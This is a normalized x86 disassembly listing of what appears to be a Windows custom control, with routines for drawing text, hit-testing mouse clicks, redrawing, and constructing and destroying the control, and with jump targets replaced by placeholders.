mov eax [ esp + 0x14 ]
add edx ebx
add [ esp + 0x18 ] edx
sub_4332c0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x8 ]
mov ebx ecx
push ebx
mov ecx edi
call sub_4332f0
push 0x0
push edi
mov edi esi
mov ecx ebx
call sub_433580
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4332f0
push ebp
mov ebp esp
sub esp 0x4c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ eax + 0x4 ]
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x34 ] ecx
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x30 ]
mov [ ebp - 0x2c ] 0x1
call sub_414260
mov eax [ ebp - 0x30 ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp - 0x8 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x4
mov edi [ eax + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov eax [ esi + 0x18 ]
mov [ ebp - 0x28 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
test al 0x4
je r-xdata
test al 0x1
je r-xdata
mov ebx 0x3
jmp r-xdata
test al 0x8
je r-xdata
mov ebx 0x2
jmp r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
imul ecx ebx
lea edx [ ecx + eax ]
mov eax [ edi + 0x10 ]
mov [ ebp - 0x3c ] edx
sub edx ecx
mov [ ebp - 0x38 ] eax
mov eax 0x55555556
imul edx
mov eax [ ebp - 0x3c ]
mov ebx edx
mov [ ebp - 0x28 ] ecx
mov [ ebp - 0x2c ] ecx
shr ebx 0x1f
add ebx edx
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x8 ]
add ecx ebx
mov [ ebp - 0x40 ] 0x0
mov edx [ ebp - 0x40 ]
mov [ ebp - 0x24 ] edx
mov edx [ ebp - 0x38 ]
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x30 ] ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x1c ] edx
mov edx [ esi + 0x10 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x14 ]
add eax ebx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x10 ] eax
push 0x0
mov [ ebp - 0xc ] ecx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x34 ]
lea ecx [ ebp - 0x18 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
mov edx [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x20 ] eax
sub eax ebx
mov [ ebp - 0x28 ] eax
mov eax [ esi + 0xc ]
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x10 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0x14 ]
sub eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x18 ] eax
mov [ ebp - 0xc ] ecx
mov edx [ edi ]
push 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x34 ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x2c ]
mov ecx [ ebp - 0x38 ]
mov edx [ ebp - 0x30 ]
mov [ ebp - 0x28 ] eax
xor eax eax
mov [ ebp - 0x1c ] ecx
mov ecx [ esi + 0xc ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x14 ] ecx
mov ecx [ esi + 0x10 ]
sub eax ebx
sub ecx ebx
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] edx
mov edx [ esi + 0x14 ]
mov [ ebp - 0x10 ] ecx
add eax ebx
mov ebx [ ebp - 0x34 ]
push 0x0
mov [ ebp - 0xc ] edx
lea ecx [ ebp - 0x28 ]
push ecx
mov [ ebp - 0x18 ] eax
mov eax [ edi ]
mov eax [ eax + 0x18 ]
lea edx [ ebp - 0x18 ]
push edx
push ebx
mov ecx edi
call eax
mov edx [ esi + 0x4 ]
cmp [ edx - 0xc ] 0x0
mov ecx [ ebx + 0x8 ]
mov edi [ ecx ]
je r-xdata
test al 0x2
je r-xdata
mov ebx 0x2
jmp r-xdata
mov edx [ esi + 0x10 ]
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
mov [ ebp - 0x10 ] edx
mov edx [ esi + 0x14 ]
mov [ ebp - 0xc ] edx
mov edx [ esi + 0x34 ]
sub edx 0x5
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x48 ]
add ecx [ edx + 0x260 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
mov ecx [ edx + 0x248 ]
add eax [ ecx + 0x110 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi + 0x18 ]
mov ecx [ ecx + 0x80 ]
test al 0x1
je r-xdata
mov ebx 0x1
test al 0x4
je r-xdata
mov eax [ edx + 0x248 ]
mov ecx [ eax + 0x84 ]
jmp r-xdata
test al 0x8
je r-xdata
mov ecx 0x808080
jmp r-xdata
push ecx
push edi
call [ SetTextColor@IAT ]
mov ecx [ esi + 0x4 ]
push 0x40225
lea eax [ ebp - 0x18 ]
push eax
push 0xffffffff
push ecx
push edi
call [ DrawTextW@IAT ]
mov ecx [ edx + 0x248 ]
mov ecx [ ecx + 0x88 ]
cmp ecx 0xffffffff
jne r-xdata
mov edx [ edx + 0x248 ]
mov ecx [ edx + 0x84 ]
sub_433580
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x30 ] eax
mov eax [ edi + 0x18 ]
push ebx
push esi
test al 0x9
jne r-xdata
mov esi [ ecx + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x28 ] 0x3
call sub_414260
mov eax [ ebp - 0x2c ]
test al 0x2
je r-xdata
mov ecx [ ebp - 0x4 ]
pop esi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov esi [ eax + 0x10 ]
xor ebx ebx
cmp esi ebx
je r-xdata
mov esi [ ecx + 0x4 ]
lea ecx [ esi + 0xb0 ]
lea ebx [ ebp - 0x2c ]
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x2c ] 0x2
call sub_414260
mov eax [ ebp - 0x28 ]
jmp r-xdata
mov al [ ebp + 0xc ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
test al 0x4
je r-xdata
cmp eax [ esi + 0xb4 ]
je r-xdata
test al 0x1
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov ebx 0x2
jmp r-xdata
test al 0x8
je r-xdata
mov edx [ esi ]
mov eax [ esi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx esi
call edx
mov eax [ esi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
imul ecx ebx
mov ebx [ esi + 0x10 ]
add eax ecx
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x34 ]
mov [ ebp - 0x24 ] eax
mov eax [ edi + 0x40 ]
xor edx edx
mov [ ebp - 0x14 ] ecx
mov ecx [ edi + 0x38 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x10 ] edx
mov edx [ edi + 0x3c ]
push 0x0
mov [ ebp - 0x20 ] ecx
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x30 ]
mov [ ebp - 0x1c ] edx
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x8 ] ebx
mov edx [ esi ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx esi
call edx
test al 0x2
je r-xdata
mov ebx 0x1
sub_4336b0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ esi + 0x4 ]
mov [ ebp - 0x30 ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x28 ] 0x4
call sub_414260
mov eax [ ebp - 0x2c ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edi [ eax + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov al [ ebp + 0xc ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
test al 0x4
je r-xdata
test al 0x1
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov ebx 0x2
jmp r-xdata
test al 0x8
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
imul ecx ebx
lea edx [ ecx + eax ]
mov eax [ edi + 0x10 ]
mov [ ebp - 0x38 ] edx
sub edx ecx
mov [ ebp - 0x34 ] eax
mov eax 0x55555556
imul edx
mov eax [ ebp - 0x38 ]
mov ebx edx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x28 ] ecx
shr ebx 0x1f
add ebx edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x298 ]
add ecx ebx
mov [ ebp - 0x3c ] 0x0
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x34 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] ecx
mov ecx [ esi + 0x29c ]
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x2a0 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x2a4 ]
add eax ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x1c ] eax
push 0x0
mov [ ebp - 0x18 ] ecx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov edx [ esi + 0x298 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
sub eax ebx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x29c ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x2a0 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x2a4 ]
sub eax ebx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] ecx
mov edx [ edi ]
push 0x0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x30 ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x29c ]
xor eax eax
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x2a0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x38 ]
sub eax ebx
sub ecx ebx
mov [ ebp - 0x14 ] edx
mov edx [ esi + 0x2a4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x298 ]
push 0x0
mov [ ebp - 0x18 ] edx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x30 ]
add eax ebx
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] eax
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx edi
call edx
test al 0x2
je r-xdata
mov ebx 0x1
sub_4338b0
push ebp
mov ebp esp
sub esp 0x40
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ esi + 0x4 ]
mov [ ebp - 0x30 ] eax
lea ecx [ edi + 0xb0 ]
lea ebx [ ebp - 0x28 ]
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x28 ] 0x4
call sub_414260
mov eax [ ebp - 0x2c ]
cmp eax [ edi + 0xb4 ]
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_443fba
mov esp ebp
pop ebp
retn 0x8
mov edi [ eax + 0x10 ]
xor ebx ebx
cmp edi ebx
je r-xdata
mov al [ ebp + 0xc ]
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x24 ] ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
test al 0x4
je r-xdata
test al 0x1
jne r-xdata
mov ebx 0x3
jmp r-xdata
mov ebx 0x2
jmp r-xdata
test al 0x8
je r-xdata
mov edx [ edi ]
mov eax [ edi + 0x14 ]
mov edx [ edx + 0xc ]
push eax
mov ecx edi
call edx
mov eax [ edi + 0xc ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov ecx eax
imul ecx ebx
lea edx [ ecx + eax ]
mov eax [ edi + 0x10 ]
mov [ ebp - 0x38 ] edx
sub edx ecx
mov [ ebp - 0x34 ] eax
mov eax 0x55555556
imul edx
mov eax [ ebp - 0x38 ]
mov ebx edx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x28 ] ecx
shr ebx 0x1f
add ebx edx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x2a8 ]
add ecx ebx
mov [ ebp - 0x3c ] 0x0
mov edx [ ebp - 0x3c ]
mov [ ebp - 0x10 ] edx
mov edx [ ebp - 0x34 ]
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x2c ] ecx
mov ecx [ esi + 0x2ac ]
mov [ ebp - 0x8 ] edx
mov edx [ esi + 0x2b0 ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x2b4 ]
add eax ebx
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x1c ] eax
push 0x0
mov [ ebp - 0x18 ] ecx
mov edx [ edi ]
mov edx [ edx + 0x14 ]
lea eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x30 ]
lea ecx [ ebp - 0x24 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov edx [ esi + 0x2a8 ]
mov [ ebp - 0x14 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x38 ]
mov [ ebp - 0xc ] eax
sub eax ebx
mov [ ebp - 0x14 ] eax
mov eax [ esi + 0x2ac ]
mov [ ebp - 0x20 ] eax
mov eax [ esi + 0x2b0 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x2b4 ]
sub eax ebx
mov [ ebp - 0x24 ] edx
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x18 ] ecx
mov edx [ edi ]
push 0x0
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x24 ]
mov eax [ ebp - 0x30 ]
mov edx [ edx + 0x14 ]
push ecx
push eax
mov ecx edi
call edx
mov eax [ ebp - 0x28 ]
mov ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x2c ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x8 ] ecx
mov ecx [ esi + 0x2ac ]
xor eax eax
mov [ ebp - 0x20 ] ecx
mov ecx [ esi + 0x2b0 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x38 ]
sub eax ebx
sub ecx ebx
mov [ ebp - 0x14 ] edx
mov edx [ esi + 0x2b4 ]
mov [ ebp - 0x1c ] ecx
mov [ ebp - 0xc ] eax
mov eax [ esi + 0x2a8 ]
push 0x0
mov [ ebp - 0x18 ] edx
lea ecx [ ebp - 0x14 ]
push ecx
mov ecx [ ebp - 0x30 ]
add eax ebx
lea edx [ ebp - 0x24 ]
push edx
mov [ ebp - 0x24 ] eax
mov eax [ edi ]
mov edx [ eax + 0x18 ]
push ecx
mov ecx edi
call edx
test al 0x2
je r-xdata
mov ebx 0x1
sub_433ab0
push ebp
mov ebp esp
push ecx
mov eax [ esi + 0x270 ]
sub eax [ esi + 0x26c ]
sar eax 0x2
mov [ ebp - 0x4 ] eax
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ esi + 0x270 ]
push ebx
mov ebx [ eax + 0x1c ]
mov eax [ esi + 0x26c ]
push edi
lea edi [ ebx * 4 ]
add eax edi
lea ecx [ eax + 0x4 ]
sub edx ecx
sar edx 0x2
add edx edx
add edx edx
push edx
push ecx
push eax
call [ memmove@IAT ]
add [ esi + 0x270 ] 0xfffffffc
mov eax [ esi + 0x26c ]
add eax edi
add esp 0xc
cmp eax [ esi + 0x270 ]
je r-xdata
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x26c ]
dec eax
cmp eax ebx
jle r-xdata
or edx 0xffffffff
lea ebx [ ebx ]
xor eax eax
mov esp ebp
pop ebp
retn 0x4
mov eax [ ecx ]
mov edx [ eax + 0x10 ]
push 0x0
push 0x0
push 0x443
push esi
call edx
mov edx [ edi + ecx - 0x4 ]
mov eax [ edx + 0x18 ]
test al 0x1
jne r-xdata
mov edx [ edi + ecx ]
mov eax [ edx + 0x18 ]
test al 0x1
jne r-xdata
mov ecx [ eax ]
add [ ecx + 0x1c ] edx
add eax 0x4
cmp eax [ esi + 0x270 ]
jne r-xdata
cmp [ esi + 0x1a0 ] 0x0
lea edx [ esi + 0x154 ]
pop edi
pop ebx
je r-xdata
dec ebx
jmp r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn 0x4
mov ecx 0x7
call sub_41ae80
mov edx [ edx + 0x20 ]
mov eax [ ecx ]
mov eax [ eax + 0x10 ]
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x20 ]
push edx
push 0x442
push esi
call eax
or eax 0x1
mov [ edx + 0x18 ] eax
mov ecx [ esi + 0x1c ]
mov [ esi + 0x284 ] edx
mov [ esi + 0x280 ] ebx
test ecx ecx
je r-xdata
sub_433bd0
push ebp
mov ebp esp
and esp 0xfffffff8
push esi
push edi
mov edi [ ebp + 0x8 ]
test [ edi + 0x18 ] 0x1
mov esi ecx
je r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
push edi
mov ecx esi
call sub_432d20
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push eax
push ecx
lea edx [ edi + 0x34 ]
push edx
call [ PtInRect@IAT ]
test eax eax
je r-xdata
push edi
mov [ esi + 0x284 ] 0x0
call sub_433ab0
test eax eax
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
push edi
call sub_432100
pop edi
pop esi
mov esp ebp
pop ebp
retn 0xc
sub_433c40
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
mov ebx ecx
mov eax [ ebx ]
mov edx [ eax + 0x74 ]
push esi
push edi
call edx
test al al
je r-xdata
pop edi
pop esi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
mov ecx [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push eax
push ecx
push esi
push edx
mov ecx ebx
call sub_4328c0
cmp esi 0x200
je r-xdata
mov esi [ ebx + 0x284 ]
test esi esi
je r-xdata
cmp esi 0x201
je r-xdata
mov eax [ ebx + 0x270 ]
sub eax [ ebx + 0x26c ]
xor ecx ecx
sar eax 0x2
test eax eax
je r-xdata
cmp esi 0x202
jne r-xdata
mov edi [ ebx + 0x26c ]
lea ecx [ ecx ]
inc ecx
add edi 0x4
cmp ecx eax
jb r-xdata
cmp edx esi
je r-xdata
mov edx [ edi ]
test edx edx
je r-xdata
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
mov eax [ ebp + 0x14 ]
movsx ecx ax
shr eax 0x10
movsx edx ax
mov eax [ ebp + 0xc ]
sub eax 0x200
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] edx
je r-xdata
push edx
push ecx
lea edx [ esi + 0x34 ]
push edx
call [ PtInRect@IAT ]
lea edx [ esi + 0x8 ]
test eax eax
mov [ esp + 0xc ] edx
lea eax [ ebx + 0x154 ]
je r-xdata
dec eax
je r-xdata
call sub_41afb0
mov ecx [ ebx + 0x18c ]
push ebx
call sub_4332f0
mov ecx [ ebx + 0x18c ]
push 0x0
push ecx
mov edi esi
mov ecx ebx
call sub_433580
cmp [ ebx + 0x158 ] 0x0
je r-xdata
call sub_41afb0
mov ecx [ ebx + 0x18c ]
push ebx
call sub_4332f0
mov eax [ ebx + 0x18c ]
push 0x2
push eax
mov edi esi
mov ecx ebx
call sub_433580
cmp [ ebx + 0x158 ] 0x0
je r-xdata
push edx
push ecx
lea eax [ esi + 0x34 ]
push eax
call [ PtInRect@IAT ]
test eax eax
je r-xdata
dec eax
jne r-xdata
lea edi [ ebx + 0x298 ]
test edi edi
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
lea edi [ ebx + 0x298 ]
test edi edi
je r-xdata
lea edx [ esi + 0x8 ]
lea eax [ ebx + 0x154 ]
mov [ esp + 0xc ] edx
call sub_41afb0
mov ecx [ ebx + 0x18c ]
push ebx
call sub_4332f0
mov ecx [ ebx + 0x18c ]
push 0x8
push ecx
mov edi esi
mov ecx ebx
call sub_433580
cmp [ ebx + 0x158 ] 0x0
je r-xdata
lea edi [ ebx + 0x298 ]
test edi edi
je r-xdata
lea edi [ ebx + 0x2a8 ]
test edi edi
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0xc ]
mov eax [ ebx + 0x15c ]
push 0x0
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ ebx + 0x15c ]
push ecx
mov ecx [ esp + 0xc ]
mov edx [ ebx + 0x15c ]
push 0x0
push ecx
push edx
call [ InvalidateRect@IAT ]
mov eax [ ebx + 0x15c ]
push eax
jmp r-xdata
lea edi [ ebx + 0x2a8 ]
test edi edi
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
cmp [ ebx + 0x1a0 ] 0x0
je r-xdata
lea edi [ ebx + 0x2a8 ]
test edi edi
je r-xdata
mov eax edx
push eax
push ecx
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
mov edx edi
lea eax [ ebx + 0x154 ]
call sub_41afb0
mov ecx [ ebx + 0x18c ]
push 0x2
push ecx
mov esi ebx
call sub_4336b0
mov eax edi
lea esi [ ebx + 0x154 ]
call sub_41af80
call [ UpdateWindow@IAT ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edx
push eax
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
lea eax [ ebx + 0x154 ]
mov edx edi
call sub_41afb0
mov ecx [ ebx + 0x18c ]
push 0x8
push ecx
mov esi ebx
call sub_4336b0
mov eax edi
lea esi [ ebx + 0x154 ]
call sub_41af80
mov edx [ esp + 0xc ]
mov eax [ ebx + 0x15c ]
push 0x0
push edx
push eax
call [ InvalidateRect@IAT ]
mov ecx [ ebx + 0x15c ]
push ecx
call [ UpdateWindow@IAT ]
mov eax [ esp + 0x14 ]
mov ecx [ esp + 0x10 ]
push eax
push ecx
push edi
call [ PtInRect@IAT ]
test eax eax
je r-xdata
lea eax [ ebx + 0x154 ]
mov edx edi
call sub_41afb0
mov edx [ ebx + 0x18c ]
push 0x0
push edx
mov esi ebx
call sub_4336b0
mov eax edi
lea esi [ ebx + 0x154 ]
call sub_41af80
lea eax [ ebx + 0x154 ]
mov edx edi
mov [ esp + 0xc ] eax
call sub_41afb0
push 0x2
lea eax [ ebx + 0x154 ]
mov edx edi
mov [ esp + 0xc ] eax
call sub_41afb0
push 0x8
jmp r-xdata
lea eax [ ebx + 0x154 ]
mov edx edi
mov [ esp + 0xc ] eax
call sub_41afb0
mov edx [ ebx + 0x18c ]
push 0x0
push edx
jmp r-xdata
mov ecx [ ebx + 0x18c ]
push ecx
mov esi ebx
call sub_4338b0
mov esi [ esp + 0xc ]
mov eax edi
call sub_41af80
sub_434040
push ebp
mov ebp esp
push 0xffffffff
push sub_4477e1
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_40e3c0
xor ebx ebx
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x70 ] r--data
mov [ ebp - 0x4 ] 0x1
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x68 ] 0x1
mov [ ebp - 0x4 ] 0x2
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
mov [ esi + 0x74 ] ebx
mov [ esi + 0x78 ] ebx
mov [ esi + 0x7c ] ebx
mov [ esi + 0x80 ] ebx
mov [ esi + 0x84 ] ebx
mov [ esi + 0x88 ] ebx
mov [ esi + 0x8c ] ebx
mov [ esi + 0x90 ] ebx
lea edi [ esi + 0x74 ]
mov [ esi + 0xc8 ] ebx
mov [ esi + 0xcc ] ebx
mov [ esi + 0xd0 ] ebx
mov [ esi + 0xd4 ] ebx
mov [ esi + 0xda ] bl
mov [ esi + 0xdc ] ebx
mov [ esi + 0xe0 ] ebx
mov edx [ rw-data ]
lea eax [ esi + 0xe8 ]
mov [ ebp - 0x10 ] eax
mov eax [ edx + 0xc ]
mov ecx rw-data
call eax
mov ecx [ ebp - 0x10 ]
add eax 0x10
mov [ ecx ] eax
mov [ ebp - 0x4 ] 0x4
mov eax 0x28
push edi
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
mov [ esi + 0x98 ] ebx
mov [ esi + 0xb0 ] ebx
mov [ esi + 0xb4 ] ebx
mov [ esi + 0xb8 ] 0x64
mov [ esi + 0xbc ] ebx
mov [ esi + 0xa8 ] ebx
mov [ esi + 0xac ] ebx
mov [ esi + 0xa0 ] ebx
mov [ esi + 0xa4 ] ebx
mov [ esi + 0xc0 ] 0x10000
mov [ esi + 0xc4 ] 0x101
mov [ esi + 0xd8 ] bl
mov [ esi + 0x94 ] ebx
call [ SetRectEmpty@IAT ]
mov [ esi + 0xd9 ] 0x1
mov [ esi + 0xe4 ] ebx
mov [ ebp - 0x4 ] 0xffffffff
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4341c0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_4341f0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call [ operator delete@IAT ]
add esp 0x4
sub_4341f0
push ebp
mov ebp esp
push 0xffffffff
push sub_445921
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ esi + 0x70 ] r--data
xor ecx ecx
mov [ ebp - 0x4 ] ecx
lea eax [ esi + 0xe8 ]
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x4 ] cl
